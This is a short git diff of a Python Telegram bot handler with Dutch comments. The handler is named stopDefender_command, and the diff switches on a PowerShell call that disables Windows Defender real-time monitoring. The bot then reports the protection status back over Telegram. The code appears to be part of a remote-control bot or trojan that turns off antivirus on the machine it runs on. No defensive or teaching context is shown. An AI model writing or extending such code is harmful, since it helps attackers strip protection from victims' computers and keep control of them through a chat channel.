@@ -86,9 +86,8 @@ async def stopDefender_command(update: Update, context: ContextTypes.DEFAULT_TYP
     - run een command om te controleren als windows defender uit of aan staat
     - return de powershell output om te zien als de command wel of niet was uitgevoerd
     """
+    run_powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true', True)
     # meld dat Windows defender uit is
-    # powershell_command('Set-MpPreference -DisableRealtimeMonitoring $true')
-    run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled', True)
     commandOutput = run_powershell_command('Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled')
     await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
 
